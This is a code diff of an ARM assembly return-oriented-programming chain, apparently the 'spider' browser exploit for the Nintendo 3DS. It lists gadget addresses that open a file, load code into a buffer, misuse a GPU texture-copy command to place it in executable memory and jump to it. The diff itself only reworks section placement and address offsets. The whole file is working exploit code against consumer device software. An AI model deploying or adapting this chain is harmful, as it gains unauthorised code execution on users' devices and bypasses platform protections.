@@ -1,7 +1,6 @@
 	.arm
-	.text
+	.section .rodata.rop
 
-#define SELF_LOC 0x08B88400
 #define BUFFER_LOC 0x18410000
 #define CODE_SIZE 0x00004000
 #define CODE_TARGET 0x19592000
@@ -20,7 +19,7 @@ _start:
 	@ open file
 		.word 0x001946EB @ POP     {R0-R4,R7,PC}
 			.word 0x08F10000 @ R0 = this
-			.word SELF_LOC+FileName @ R1 = filename
+			.word FileName @ R1 = filename
 			.word 0x00000001 @ R2 = permission
 			.word 0xDEADBEEF @ R3, dummy
 			.word 0xDEADBEEF @ R4, dummy
@@ -60,7 +59,7 @@ _start:
 		.word 0x0010c2fc @ pop {r0, pc}
 			.word 0x3D7C40+0x58 @ r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
 		.word 0x00228af4 @ pop {r1, pc}
-			.word SELF_LOC+gxCommand @ r1 (cmd addr)
+			.word gxCommand @ r1 (cmd addr)
 		.word 0x0013035C @ pop {lr, pc}
 			.word 0x001057c4 @ lr (pop {pc})
 		.word 0x0012BF04 @ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
@@ -76,15 +75,17 @@ _start:
 		.word CODE_JUMP
 
 @ Data required for spider rop to work
+	.section .rodata.init
 InitData:
-	.word 0, 0, 0, 0, SELF_LOC+_start+0x8C, 0, 0, 0, 0, 0
-	.word 0, 0, 0, 0, 0, 0, 0, SELF_LOC+_start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
-	.word 0, 0, 0, 0x0010C2FC, SELF_LOC+_start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0, _start+0x8C, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0, 0, 0, 0, _start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0x0010C2FC, _start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
 	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 Self:
-	.word SELF_LOC+Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0
+	.word Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0
 
+	.section .rodata
 	.align 2
 gxCommand:
 	.word 0x00000004 @ command header (SetTextureCopy)
